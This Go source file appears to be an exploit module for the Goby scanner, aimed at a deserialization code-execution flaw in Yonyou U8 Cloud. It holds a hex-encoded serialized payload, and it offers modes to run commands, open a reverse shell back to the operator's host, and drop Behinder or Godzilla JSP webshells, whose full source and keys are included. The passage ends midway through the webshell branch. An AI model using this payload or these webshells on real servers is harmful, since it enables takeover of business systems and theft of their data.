package exploits

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Yonyou U8 Cloud CacheInvokeServlet Api Deserialize Code Execution Vulnerability",
    "Description": "<p>Yonyou U8 Cloud is a cloud ERP overall solution designed based on the concept of enterprise internet, integrating functions such as human resources, financial accounting, logistics inventory, customer relations, and production manufacturing. It aims to promote agile operation, lightweight management, and simplified IT operations for enterprises, and provide safe, trustworthy, compliant, and reliable services.</p><p>There is a deserialization code execution vulnerability in Yonyou U8 Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Product": "yonyou-U8-Cloud",
    "Homepage": "https://www.yonyou.com/",
    "DisclosureDate": "2023-10-22",
    "PostTime": "2023-10-22",
    "Author": "14m3ta7k@gmail.com",
    "FofaQuery": "body=\"请下载新版UClient\"",
    "GobyQuery": "body=\"请下载新版UClient\"",
    "Level": "3",
    "Impact": "<p>There is a deserialization code execution vulnerability in Yonyou U8 Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability repair program, please update it in time: <a href=\"https://security.yonyou.com/#/patchInfo?foreignKey=dc9efa413a644d88b55403cdc150cfea\">https://security.yonyou.com/#/patchInfo?foreignKey=dc9efa413a644d88b55403cdc150cfea</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse,webshell",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla,custom",
            "show": "attackType=webshell"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "test98765X.jsp",
            "show": "attackType=webshell,webshell=custom"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(123); %>",
            "show": "attackType=webshell,webshell=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2023-96384"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "用友 U8 Cloud CacheInvokeServlet 远程代码执行漏洞",
            "Product": "用友-U8-Cloud",
            "Description": "<p>用友 U8 Cloud 是一种基于企业互联网理念设计的云 ERP 整体解决方案，集成了人力资源、财务会计、物流库存、客户关系和生产制造等功能，旨在推动企业实现敏捷经营、轻量化管理和简化IT操作，并提供安全可信、合规可靠的服务。</p><p>用友 U8 Cloud 存在反序列化代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "Recommendation": "<p>厂商已发布漏洞修复程序，请及时更新升级：<a href=\"https://security.yonyou.com/#/patchInfo?foreignKey=dc9efa413a644d88b55403cdc150cfea\" target=\"_blank\">https://security.yonyou.com/#/patchInfo?foreignKey=dc9efa413a644d88b55403cdc150cfea</a></p>",
            "Impact": "<p>用友 U8 Cloud 存在反序列化代码执行漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个 web 服务器。</p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Yonyou U8 Cloud CacheInvokeServlet Api Deserialize Code Execution Vulnerability",
            "Product": "yonyou-U8-Cloud",
            "Description": "<p>Yonyou U8 Cloud is a cloud ERP overall solution designed based on the concept of enterprise internet, integrating functions such as human resources, financial accounting, logistics inventory, customer relations, and production manufacturing. It aims to promote agile operation, lightweight management, and simplified IT operations for enterprises, and provide safe, trustworthy, compliant, and reliable services.</p><p>There is a deserialization code execution vulnerability in Yonyou U8 Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability repair program, please update it in time: <a href=\"https://security.yonyou.com/#/patchInfo?foreignKey=dc9efa413a644d88b55403cdc150cfea\" target=\"_blank\">https://security.yonyou.com/#/patchInfo?foreignKey=dc9efa413a644d88b55403cdc150cfea</a></p>",
            "Impact": "<p>There is a deserialization code execution vulnerability in Yonyou U8 Cloud, which allows attackers to execute code on the server side, write backdoors, obtain server permissions, and then control the entire web server.</p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10867"
}`

	sendPayloadORREIZXCUIEQOH := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		postConfig := httpclient.NewPostRequestConfig("/service/~iufo/com.ufsoft.iufo.web.appletinvoke.CacheInvokeServlet")
		postConfig.FollowRedirect = false
		postConfig.VerifyTls = false
		postConfig.Header.Store("cmd", cmd)
		payload, _ := hex.DecodeString("1f8b0800000000000000cd7bcb8f2beb7657df7dee55c80928373752148901adcda43b67d36dbbddbdbbb37580f5d5cbe56797cbcf3a8aa05cae2ebbabec72bbca2edb87c30009456294c10d11420206cc80488841221042110306884830210a63440620c15f00bf556577bbddbdf7d9370889aded2ebbbef5ade76f3dbe72f73ffd1f473f8ae647bf746f2fedb3453c0ece4a763432ddf85fca7ffbb7ffeeefff5ef18ba3a3d52cf9b34747476ffeca5f3de27f3f007d319c7b67f6cc7646ee99134e26e134c235085c271ef37bdf5d2fed60e19eb5c6eeb066cf94693c5fff9d7ff69ffefecd1ffc85fff2e6e84df5e80b90c4473fa9b2e0f3c09e7ae78dc13db67fc0d2c49ec547bf982db14ee7e0f061857b5fdc8521a4ffdaf748c7feb3aabd5963dbf4bffef46ffd83f58f7ffac5d10faa473f77673b713887dc7755b038cf589c6f599cefb1386fcded697417ce27ee1c9221f3d7bf47e6dd62cabca33369648fa7ee708f41eedffdce7f3fd9fcce0fdf1cfde09ba33f37de5b89e2a3bff4cdcfa6ca62beddf22965f6b7fcebceaffdaf3f2afeeadf7bc38144f87e08633e7cb631f814dbd3788f616ff95bbf446ffef94fdfb0477f7ebca37838fa9b475fac66cbf9d131c76d751639f3f12c3e33d38b32f5e0949a3db53d777ef4f4ef6773ad3e5d86be3bdf53e637ffe47ffbdffe8d3fbc7e73f4c537473f1ad3dc834b7ff99bd750f50be39a1b8fc261dd9eb8cf8167c6f3f1d4fbf00d486eedb93d69ad672ed8fc649f8d14d85194b97fcbfe8cef9f6dd9ffd61ff6fee18fa3d360e7e4a3f8e817a66ea2a7be715cecfac9feae8cdb3ff995fffcbbfffe3f588f91398ad889bfbce09fbfca89161fbdb98722bfe8b95b078a356b9f12fc792680b77ffcc435b3e31ffdcf7f7cbdf9f02f44caf505c7e22512f1f8db2f8f8f83d01e9ebc9d22dbc3f9f4d727e1661c04f65f83ff67767c761fbd3dfdf0e577c78e1d3ba3e313f7f4f8dbefbe4ce380881c439ff634b2efdc9353e6b4b4e7c7f1c8cd6e654e3efefaf8c0da33048c953f791b2da6679371e49c651bde9e9e819fec3a813d7787ead80da0d6233b56e3f890fb59e4c6e4386e148d07817b12cf17eee98763d0cddd78319fbe2007ff93e92208d8a4272be6ee245cbaa9721263ef041a6c368f162d520e3064cfda0fdbb59492a6e1743d091751ca0284d98eb3a17b87503d5fcd78bffba84f0e16329f34dd285ccc1d972244d6b527276fb35dce9604f7861404621dbbd1c9e9bbad85998673f76e9b3fb21ddba957a1e12b7abfe2fce77bb3086c6d9b2de20cf15b83b6b7c3f45ebabd717787e89cbc22ff51c3bd180cd633e8d07c2456c741ecce4f4e8fbf7d614796330c862d808f0f173f05bafba17f369e82f7d40eceb6fbce9ee466463ee17d3e0fe7a73fbb1486f647997f1eaea2482ceeeedc39080e04bf0e8927311fc1c54b44fc4cc03d50e2ddbe8eef8e9f61ee8ea39c45109d7787b98fc97d0578cf19bc7d643c49d3f8ff86f301878cf5f8eef8e4159d793bb78093d3b37144a831ded4469951e7e1e4e4d309fc383fa5224e77007a913b2f7cbaa540b388c7ce7e1abda2dee9bb4fa0fca5166c4ddaa3e70b6ea2306aaf2f9d9c3e42939df19a9fff7ff2c66bfafd3f72c78be6f0f9a5fb79857bdeaaecc7b799f1a7994f3e5517b25528339f8f87ee0efb9fa1ceae10d181cc571bee8effdb7d99a9d79feac3cb2aff4cabedcea7f88a300c5c7bfac2e8775bceef8eb3cebdefaeac0665a567c005ecb11f3bc106aa70c1d99505088f78cfbe37cc7514bb1336f0761ecedc79bcdeba644bfc5454beb70e573120a5751808c9244cddf8acddac4a4fab27afb87b3eb7d7cf50f5e9586d99be05907319fed0e03258704e6ef53e8b66c1383e797bf6f6f49bdc6f1cffe5af8ff3f95d461d7fb48d6611d9f3e9f74f67070b9999cf2193313979bbc7f7ed27b2f01b01db9e567574611c02ce5afd5b657fd7fefdade2cf73e785195baaf3f3e3fff6af7efb4ffecd6f3ea73f4e1733d4bcd88a59808f12277b817e779ce20d51d8be3b0bdca9178fb652be7383c8ddf99b31329b87f176c2092738f2ed0325729dc57c1cafcf6e0f884e5e9248e1d035d3a69ecea8fb2ef9d342ea91b783043893f0637c37c668e36e4196f5ed77c7cfacffe637b696ee9cf66c2ac83232dbf6ba9f0ed81dba67e746aeafe994b51db23297a6efcf6638bfc4666c3b3e8e78ce361fbf83783b08d6bb612c9df0a16156a9f767493b72af8a00291cda0a79fa3941997f1a2507f1b3e41ac49f754811642a3bae9c07cfda059cc3f7b3692895f661cfbed36f778d956565b56b6befa316dfa7c7530b13a9792f34c8f292957b54e75191435532753e539b3da17f0a21afd8fc69435f7d0600516703847fbefe98f907ca7cf77408e4707ff7655acd41f1f5dbf5f2ea6ae91191ac88891752c99362c91332558a15526a344fd27b8944d24af2c8a1aa5ea16a8d620a294aa4bc48a4424a5f7574aab42b2429b4208f16065e9e438bc4a3253e2f0d8796cc9fa4738964c24b884496a484ba54ab55a966d0ca886845b286b5125e3ad6cba9cc5a58a25a54a15a421bf0dd80ef067c73d0e13e919ba019515dd7a95e2b53dda0bc11529ee42e78f4244fbaa5ba57219150017b0bd85b609b4876b03e840c17d73bbcbc5456432951434f6d2f82ee92e43ed6825446a3af53c3496dbc824d5790a31bf2432aa311612d49d7de43ce7bcf67dd969227b7e996caa45fd3357c700d1f1889bc497d766bc067e079dbc6ab5f619a1bd8f55566d72574bb025d8d6ea312dd82b752a473235dfb0af71b747bcdf70481bee5294262571bac7b222861dd14452245953c452323d55b48e409c9c0cbc32b71a044483d238df9908c9c4e06e2aee604615d4e3ca1805e01bde2854249943678b5a8d92e5113fa361da161bf4d8a0539367884d4449c340fb14cef3ba0ef513397d296c0b3049e3aa5bc462251c6d89323b356a192c1bc849a287e76cf48ef958d50943d650a3e13321147d31715e85231141206edfead537f9a512aa70a9d86c4b62a71ea13b3a89379ad538b2ac087a8a53e54d658dfe095c32b8f5701189fe17a01bd8a640091beda6ab6fab95eaeae1b9d720bf7cc96361b0d27ca72a0a90b6b7dd31a96cab3c1c4798fb5ba51b8593817cdd160daecf6bbabbc05bf35a0274d8204eb8aa3ddaca11724ae1efa3d6b542dac46d8bb34bb9739ab3b0c9cfb08b1ec5fdbddcbd950e6b8d6c24aa78f6b531e149a0178dcb6b46061b52ff3836e397082e6a83f59f1fd4ab337bab77a226777a143a290d45d2dfb5decd3d40d7f2e9b98f4276aa16fde44fdeee5b49aafe79c09786da2d9814dd99e0deb12b4ecee70d1ef35f3cea42d48f2c28fd95f693fb7c9c0d5b9a85d57ee8bec1bd52995976ec9078ffe67f3685f34d7f0c5b401fd456fb8b67ba90f8a15e52374b98fdc5f071fb31d36ceee075a67e40462e44cd498e364f546419f655e9483e1a4b3760a6cbbf351bd4df353fcebeb61976369f956b7beb434f0129ff0412796389eedc20d7c5e0f9a9320b218eb3925579da47b6a54766842896878ca7b99946b6ae56ad42a8adb54e766e84c3a23ab54ab511b296238c2f0126124aa2293aa521b7812f5c181fcb65d2a07fdae017e6a89da1ef6fac2f4c04f1be5862562fd73fd5e796af50cec2f3ff7f3b4b3184cd4f1806d039dad059bb2cc7b8621fce1c3bf6bd8e43ef351ee12f1e9dcdb8a35b3ba2b7f1fbfd0a14aad6be6351d6837e37e37e13825cee40634f5cde0a2bc01bfc6965f7ea8055135b79a391706f44e440b36b760732b510df06a52474fe360f5145c63d8d034c12719142e37ec5bb9f00afe9344b413b50d39c673bd6fc6f6a4733f2447748c44743cb5079ab255e8e44ce0c8ca6c355ec503e243857a6c51820a258da05b9f3a3ee7d9063ab5869a9a1bf66a25ea8435ea44a28718f70cd5053f1f364fab1335e977eba1655ee60685fc7dbf672c86bde66c205d8e87ddfec2980639ab5d0f87ddcb393aac4365e0a2732dda88a354aa0743a57c39d43aec3ba99bd36be8bca2837a240acd65e7a23c1ba6d8ac3f8bed7e5cb0af95d975b9b0bbd75b79e5bc35b10287b1521aaefb3d025f85a6f0abfe5a5d41dc878ab5848e87311f5317b677812f621e6d6181a7a2d597836e1eba18de607293d335d43e2dc1ba234cd6ddacddebebda3df687d4f56b543128e49adb820fbba1b0e1737df2c403b951b07ae58d658a707051073f6be94cf2a3a12402675a5e3a63ce2f381cb11d901ac38f1d2a73ce88677ee968a3b5d5557dacf7a85b84ac6be424eb63f865c9f0b957589cbba69820763162e541ee7a70a123eed2982a35d8d921039034808799218db8e76c71331bac6f34bbbb0a52fe3de492186de507cb6ace9a21a76e11fb64c8b8497337c775413846420f86f490cae821c6bd5a5a2b8628bcf0513ecded5e1fbec3bd44e53e571a5cd4387f630b79e3c26ed74bb1f91eb49c3717765abf9a09d752c64e953f8be1abb5d69876a05b137848c41da9375cfb7529bfd0658eabbe4cebaa49f150c2f8065e4e8165e8711fb3c81def49349e0e03eac33142cd645c74809164d92ed421eb12bc1de181d64b3425f54f9feb4ed9e943f791a795d29c673bfb9e18c1ceb121f5d9ce6a0135767cb3b153cc230fa5cbc0d5dac04c5b8cbdbd3a30e9e490b3cb7e210e86884d9068559934f0838ffb45d146eedfa33ef8a43571df240b33a3857a5bd145007981a17571bf87fbb0218fba83fc98d6035deb14d10350afda3b2c44ba96df586b8a6f61cf04ae829e02731ba690c7dee3a5fd083e009696f61af8b47c017cd2cc93381e5de7a2b3a84ef233a7505bec6696a6d6b9e79981f352463cfa851b7f3f57952c3777f543eaf7ea41fd9e6334e3faa864bd2aad659383da03bef9986b677592d2dc5727dcbbd4b56beef3298b3afc6c60fc34724db5e90f75b33dabb6947ca39517cd76506f773a56afab0676bf5bbe079f895518cdec491c0dba974ba7a4ae314be587d361d1ed8549ada56fea3210b0f12e2b6bee0df9fb217c686176dae522746d57a4c35ebced8732f7e24bb66ddbeb9a25f493bc031d35d33b9c819ed3a47b47bcf7719e52d62ff63ccd4d42ec7c18a16706d6b6c741bff8a3b3cbe18c82f85b98edfa17c612334030d00c9ea37adf43c37ee15e22fa857ae05cd467dbf950a9a8e1ace371ff19063c8396c707f3e0aeafc92fe6c1dbfe64c632587e89fb5c2bad150ae1607148bb3f0febc0dc023d6d3698a2d689e870e6916d4d5db70b9dd5b0db59f40b6dcc3e21eb3f4d7b610ff578c2feab73bfd279f6c37c9643cea4f3d3e3acb8ad0de6d33acb369fcf06e853bdf26888f99b6d80dc4d6bd229b21f0871eca6730e6a4189671b233c9c435b85f20362996ba47335fca7e483a1365a5a8c6fe96373757c3863edf071e83360d78a987f35b7e5cb787bacf7990ec0f00435ff7e28ddd4e19f7050e058a30f4cada5cdf3a9ec1ffaf7316edddc47ec39c4dc13067678975cf62bd76cc41a33c3534d3e3cbbb00fd5a6d5567886500ff866714ce7f80b6b3428758256a19fc6f1c5ec9c0b80990e64a771aca2165f40c60638628c30ef83dc7a8a8528a097fb97a34197e93a59be16a05f6f94cbce23f5daa0a0fae08d75ff459c0f68587ee7353b5adacd6eced3ac9e9ac7598f31da39cced3d3fdb9c83696e206fa4699d67e99c931f62e642ff13ed4f9c0738273a1b475bcdd2bc5d7ffc1c7718e7fdf39354c2f9063d88e3f59aae7b75a8cc75e6c5fad38cff3e3b93763826e97956fdc4d9926b8ef2b4fe38d7404e9767838a1a4b5b7e13e022ebcd882d6633ae5b3a7276e70bd0dc4cd3da36c53c57423fec8851ea3f1aa2c70ac8e63d4239d4dd288c70be433dec758201ce5487e7c417eb9f3a2f1ecc81ed8b007ee8f0b9b1cab5b18d73ae036c0cf9ac4b716e905b2d8785ceda28a8e95943a08f627dc178ad7efe997ceb83a134ec62a6047f8ea9d27d466362a6462dcca7cf03525d1033d4bfac56bfec718ff4ccab228d0eebd5c7cfe5b0b15fe86c7b9dfafa1a78ca13ae95c1c241ac185fe8d1718aada71ecd78280fa6223f54d9f60e94609e4fcf1970cee01ab33fe76ef1b7ca3b850eeac06a36e8727dd73f79463fec178fb3e4fde35ca0a6f37fb0d5c348cf45e8a14dcc69fee7f17ed53f1f3feba3f6710edca63d157a1df8a97fe0a7c379ff7dd617ebe82b371b8bcf4d8f67373e23bcf07b99d7907bbb674632f897d3e7523c1f711eeff9fc157d90577e9acfa25747bfea24d9bd6cae90ba9d227af4f6b9173e4fb23e897a3ab2b86ed368f6f45c8c46fcacb3e4f133826bc2886d539970e6c2e7b2cecff3242ad7883ca94d6565fbb94d013fa7269fd0747b54f678dde227d7b1471a09d053a551993b4403accdfb44b9648e3545f1ba05f4ca7a954c5c9da8f2be4f12c8714226a95d8c1b9e61896ab1208c5a418cda9a6a74c7106609d1d66af7614933ee4a44f694fc9a2578ef7da86b86674a782f9743929bbeae7805f05edb29ddb89dd209a13758b7969928b896aac22fe1aa373cdf921ce4c76548e2c19168e497533d47d2333d356382ab77253577eb5aba3e4ba8dbf0424b1a4046b54f0a64292bbd7920abfc286b47b7d2db298d8da9570e2b197fc354b126fc5cc434629da4f4921c961fd707afacc37f6a84d73df379b82481fa2c8755cd58e03d6a72d9171879ab0b832ce0e44a167e2db3e1e1c0c6756a237c58cfd62379699083f743cdc8f17b17efef1a5ed19207a94f3d51cd5109476f65acb6b6740ad3758d9aa9078d0289730456b99257feed2a216d76fe55b332f26f417b8f97df189125cf535ec18e57e4d1a40d3f969a7e23bd1780bf21eb0ba2697a3fef3c28e3718124ff4a69faeceb07f6add2d4e762bed367d5ea1ae69a240bd76e7a055dac19beb6d5cf52d4ba25a8512469089ab6a554afd2f76c6367e537521f8c8b6c8f93d277d89e9c257be60d894b8b567e39d3c79d92727da598a159435c2aadd0d49aba5933986e053a3d62ba6ad33777f6684dd1ca7ce9efec5fececd79ae5ad2f8b3b5f5a522afba607bc35f0521bde58119e363db7dd1562c7cfb0e6542992e2c90daa27749190498e0168e81b92aee936110a856daa26a2449a2e8d0c5a92d6a6915151797d4ce5f36c9df33ee45476497638c97bc4c3155115c023d5407d102169094de00bf0a53b542dd24934f8fb16d493312143f544e44932e8cea080740f25426a71924ff80b920aaa83077da51ccd3d9a8333fecba8eb455af17704b522d50c08970db6634d0d856a891c91dca66b830a74ebc3440549cbdf9fd025351d6a78ca86302bdf7a2862ed1add1a2a5816058ad239f543b6e016d1143e7f3761e5a8492534edbed810fc31acc1597a83141ffe821df7f8ece9795222e9d640310b72d432e01fe59abfaa69b19fda46a504fb251caf3b548ed84f0affcffc97d014351d79c7f72fe10daeab44429903c3eb482914e18102ece39a98c76e7ecec63f54926b5c536dfe2c7be0c10140bc3900821fa1ecc9aa25929b7ee3e24977fc999f63f275c2dfc5dc5e33bfb4604fd64bec4eccfa7801992e5cd2371b5562d9972d29321bc05fe3d2a7c63a9cc7095d2bf7a89ff265bd5a2daa53e4ac72ff55521927726dde866a612464069a865c71e1a3ca7b52ea16d7faa6528c634fa88a6f27955599ebeb7be832ae8c17172427e62d6ac62d6ad7d2ebdeb10e66951eaa545b57c958635f39822ee65617d90c1f2aef1dba453e99efe921e381faa42c92d4e6ad8fda1eb5f96a27546750a2232e30c3d3202197435c31c49af1ed308e4a6d6a18023cfa344cc42d37bd76222ef9d1afeb893b2a45647be29af17b67001aa56bbaf32484cf21cf909aa4a7b1e1e7857ce57e47c33446a90a8545226a5d137a2af906de37ba66e182eb8210be52ad42166c69377df404616a066aaeda981245e93aeeb523097e57bb09870db89ea0beede523a70ee3496af015ef5adc8f4b24999c773ee76319b5c7409f96220a0c5af17713c0864f15e5515ff093533c025695957ea5dcdb9089588cf40274e82abe63d61183ce9c324866b2b50c4a92c7d7f4f9e80e674e8d715666daf2aadc83f3fbe063b54cc65a50a376315202ee336b1e6be61841b3f712bf5f677d5ab8ef49cd5b71225c9e077aabb2071e77788d5a64df90a4720d1db7f3bea24cca5cabe7ed4da8a00ede006703e0ac065d3cbc77d2f71ef5e0ff6177e0508f31af5e9b7de68b57bf9d70fd1f717fb2b8fe8b7200be6a255fbb128891354a63316dcd8105d5673ccfa0d78332011f2db9124d5fc5bd18f2d05f31cb68578861dbacdf871a64868839ee7d75415a68da90379043f5519791afb15dd9be02e211590239317870483453ffa73637bcbe2530eb541deef1e05722cc30b493ddc67abce2b9027b1de16b911ceafbb45295731f08ba8d84e07a8ae87c95289c2ff8acdc5293638acfcd44685e564e267cd5424a3f577cec961e888af4c0936525479a212d1857f304f5b4aa50c793364c1c13f205b8c68e4bae770baeebd588960992aeaed0d2902fa85a847c59e29a94248a8ccfd0433a27c34359843e355d28892c731d4f582f7cd6099f196bfc5c7587b59ece58e3e1928aa327ac6df105fb7cd369733cfaa6e3a3976b7d8edfa6e1a182949a5665b5be400d603f728c67a99fa1fb60c373256252ea5f49592e5e705fe6d8b8e96cc66b131b596009e4863b43f9133eee23774ac045693d3dffaa98ce994f6beeb335a9fab886596efc7c0d3cefd2b952dca824be82a329ad0fbacafd1e73e3627a7e594c7545bc810149c27d8f31daeb4c2e482d9a1ee39be3af9b29de47832dde07648ee6698f98721cd13d96ecbf25c70321dad5518ce903bee60cfef65c27957f5702fd3eefa19fd71daa1a3286569d0a86c07a485d92075c152e48c4542fd2d090ef48d7a96848156ae81424b2cf7df0926b45a34fb3440e59fe952161820929f264e0a44def0de98a4730e8b342dce93de3e0167c1379cd717f20a9ff187fcc0b9464bd12b3d603b04795391486ff46b075acf22cf4d41b50ad24bede3086311800d333aa84bb5a88c6cf16a48c233402730c27d4d09f9430dccd7ca69ecd7c11cf98bbd9adf238d76ef05ad5100ba5652e4ba4d4ccf17bf018a141bc072de2553294c7b9b965aed319fefe692e1ca5f323ce09db39ef21fd8cb05481f2aab206969bf5cab543755169f0ec8033c5cbfd38375579eedccda5eb593a5ba29144fc6a55505f941cd092d5fe2a7fc9c5e969881514e499f0922a7d7ae09970570bd02315760dbf3c057ec4392241ba1b7d2420cf5e8a1009e5c9f0d188940a7aad900d0c8446042c20a74bbe500c38a9a9f3ef77b4c05fa81efcdf34e8c153d2983ea49d5cc700f8f5d76f3f7cf9e217214f5ef97d397e7b7afa01b4cf7fcdea437cf44397ffa0eff12f8ff8cd5f7cf98783357bf6a39ffbe33ff8b7bff2d7ffe317476fd4a32ff9af8cd4f4afeef4a39f8f4773371a85c17035dbfe2de151f267f0e3c7e99f82ad56ff0762a7d64c8d380000")
		postConfig.Data = string(payload)
		return httpclient.DoHttpRequest(hostInfo, postConfig)
	}

	checkFileExistDNQZXUWEH := func(hostInfo *httpclient.FixUrl, filename string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig("/" + filename)
		getRequestConfig.FollowRedirect = false
		getRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkString := goutils.RandomHexString(6)
			resp, _ := sendPayloadORREIZXCUIEQOH(u, "echo "+checkString)
			return resp != nil && strings.Contains(resp.Utf8Html, checkString)
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			webshell := ss.Params["webshell"].(string)
			if attackType == "cmd" {
				cmd := ss.Params["cmd"].(string)
				resp, err := sendPayloadORREIZXCUIEQOH(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp.StatusCode == 200 && len(resp.Utf8Html) > 0 {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				}
			} else if attackType == "reverse" {
				waitSessionCh := make(chan string)
				rp, err := godclient.WaitSession("reverse_java", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				cmd := fmt.Sprintf("#####%s:%s", godclient.GetGodServerHost(), rp)
				_, err = sendPayloadORREIZXCUIEQOH(expResult.HostInfo, cmd)
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else if attackType == "webshell" {
				var content string
				filename := goutils.RandomHexString(6) + ".jsp"
				if webshell == "behinder" {
					/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				} else if webshell == "godzilla" {
					// 哥斯拉 pass key
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){}%>`
				} else {
					content = ss.Params["content"].(string)
					filename = goutils.B2S(ss.Params["filename"])
				}
